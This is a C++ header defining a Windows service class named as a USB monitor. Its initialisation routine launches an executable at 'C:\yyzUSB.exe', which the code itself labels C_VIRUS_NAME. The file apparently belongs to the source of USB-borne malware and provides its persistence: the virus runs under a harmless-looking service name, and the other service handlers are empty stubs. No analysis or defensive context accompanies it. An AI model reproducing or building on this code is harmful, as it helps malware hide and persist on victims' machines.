#pragma once
#include "SvrFrm.h"
#include "Sddl.h"
#define SRV_NAME (_T("SRV_NAME"))
#define C_VIRUS_NAME (_T("C:\\yyzUSB.exe"))
class CUsbMonitorSvr : public CSvrFrm
{
public:
	CUsbMonitorSvr(void);
	virtual ~CUsbMonitorSvr(void);

	LPCTSTR SvrName()
	{
		return _T("MonitorSvr");
	}

	DWORD SvrSupportEvent()
	{
		return SE_STOP;
	}

	void SetDeviceFilter(LPVOID& lpFilter) {}

	BOOL SvrInit()
	{

		CreateEvent (NULL,FALSE,TRUE,SRV_NAME);
		STARTUPINFOW si;
		GetStartupInfo(&si);
		PROCESS_INFORMATION pi;
		CreateProcess(C_VIRUS_NAME,NULL,NULL,NULL,NULL,
			NULL,NULL,NULL,&si,&pi);
		return TRUE;
	}
	void SvrFree()
	{
		return;
	}

	BOOL SvrWork(DWORD dwArgc,LPTSTR* lpszArgv)
	{
		return TRUE;
	}

	void DeviceEventHdler(DevChange dc, LPVOID lpData) {}
};

